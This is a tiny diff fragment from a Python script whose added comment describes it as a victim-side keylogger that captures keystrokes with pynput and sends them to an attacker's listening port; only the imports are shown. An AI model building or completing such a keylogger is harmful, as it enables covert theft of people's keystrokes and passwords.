@@ -1,3 +1,4 @@
+#Client side (VICTIM) script to log the keystrokes and send to the attacker port which is being listened on.
 import socket
 import time
 from pynput import keyboard
